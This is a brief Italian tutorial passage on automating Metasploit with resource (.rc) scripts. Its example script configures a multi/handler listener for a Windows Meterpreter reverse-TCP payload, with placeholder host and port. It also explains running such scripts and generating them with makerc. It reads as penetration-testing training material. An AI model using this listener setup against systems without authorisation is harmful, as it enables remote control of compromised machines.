## Automazione con Resource Scripts

Metasploit permette di automatizzare comandi ripetitivi tramite gli **script di risorse**, utilissimi per semplificare operazioni frequenti come la configurazione di un multi/handler. I file `.rc` possono essere scritti manualmente oppure generati automaticamente da sessioni precedenti.

Esempio di script `handler.rc`:
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
run
```

Per eseguire uno script `.rc` all’avvio:
```bash
msfconsole -r /path/to/handler.rc
```

Oppure direttamente da MSFconsole:
```bash
resource /path/to/handler.rc
```

È possibile **generare uno script automaticamente** con tutti i comandi usati durante una sessione di lavoro, utilizzando:
```bash
makerc /path/to/output.rc
```

I file `.rc` possono essere salvati anche nella cartella predefinita:
`/usr/share/metasploit-framework/scripts/resource/`

---

